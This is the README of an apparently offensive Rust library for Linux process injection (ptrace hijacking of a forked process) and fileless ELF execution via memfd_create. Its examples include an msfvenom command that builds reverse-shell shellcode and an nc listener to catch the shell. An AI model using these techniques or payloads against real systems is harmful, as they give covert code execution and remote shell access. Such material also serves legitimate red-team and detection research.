# libinject-linux

`libinject-linux` is a Rust crate containing implementations for process injection and fileless ELF execution techniques on Linux.

## Functionality
The following techniques are currently implemented:
- Using [memfd_create(2)](https://man7.org/linux/man-pages/man2/memfd_create.2.html) to create an anonymous file in memory, write an ELF to it, and then execute.
- Using [ptrace(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html) to stop a forked process, overwrite its RIP register with shellcode, and then resume it.

## Library Usage
Add `libinject-linux` as a dependency to your Rust project
```bash
cargo add --git https://github.com/dustyw0lf/libinject-linux.git
```

## Library Examples
>[!note]
>The examples can take binaries or shellcode from either URLs or filesystem paths.

Clone the repo
```bash
git clone https://github.com/dustyw0lf/libinject-linux.git
```

Change directory into `libinject-linux`
```bash
cd libinject-linux
```

### memfd
Run the example
```bash
cargo run --example memfd
```

### hollow
Use your own shellcode or the provided example
```bash
msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
```

Start a listener
```bash
nc -lvnp 1234
```

Run the example
```bash
cargo run --example hollow
```

## Acknowledgments
The code that turns shellcode into an ELF file was taken from the [minimal-elf](https://github.com/tchajed/minimal-elf) repository by [Tej Chajed](https://www.chajed.io).